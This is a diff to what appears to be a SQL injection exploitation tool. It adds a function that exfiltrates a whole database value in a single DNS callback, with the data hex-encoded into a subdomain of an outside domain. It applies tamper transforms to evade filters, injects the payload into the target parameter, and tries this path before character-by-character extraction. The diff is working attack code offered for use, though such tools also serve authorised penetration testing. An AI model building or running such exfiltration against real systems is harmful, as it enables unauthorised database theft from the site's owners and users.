@@ -278,6 +278,35 @@ def _extract_value_parallel(args, profile, request, domain, log, run_id, session
     return result
 
 
+def _try_direct_extract(args, profile, request, domain, log, run_id, expression) -> str | None:
+    """Try to exfiltrate the full value in one DNS hit (HEX in subdomain).
+    Returns the decoded value, or None if unsupported or no callback received."""
+    prefix = f"{run_id}-d"
+    payload = profile.direct_payload(args.base, expression, prefix, domain)
+    if payload is None:
+        return None
+
+    _log("INFO", "trying direct exfiltration (full value in one DNS hit)")
+    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
+    if tamper_names:
+        payload = apply_tampers(payload, tamper_names)
+
+    injected = inject(request, args.param, payload, args.place)
+    try:
+        send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
+             proxy=getattr(args, "proxy", None),
+             verify_ssl=not getattr(args, "no_verify_ssl", False))
+    except Exception:
+        pass
+
+    value = log.find_direct(prefix, args.timeout)
+    if value is not None:
+        _log("INFO", _hi(f"direct exfil: {value}"))
+    else:
+        _log("DEBUG", "no direct callback — falling back to char-by-char")
+    return value
+
+
 def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     profile, request, domain, log, run_id, session = load_common(args)
     extraction_id = session.extraction_id(args.dbms, args.place, args.param, expression, alphabet)
@@ -304,6 +333,15 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     print(f"  session   {session.path}")
     _sep()
     print()
+
+    # Try direct exfiltration first (only when starting fresh, not resuming)
+    if start_pos == 1:
+        direct = _try_direct_extract(args, profile, request, domain, log, run_id, expression)
+        if direct is not None:
+            session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, direct, True)
+            session.close()
+            return direct
+        print()
 
     if getattr(args, "threads", 1) > 1:
         result = _extract_value_parallel(
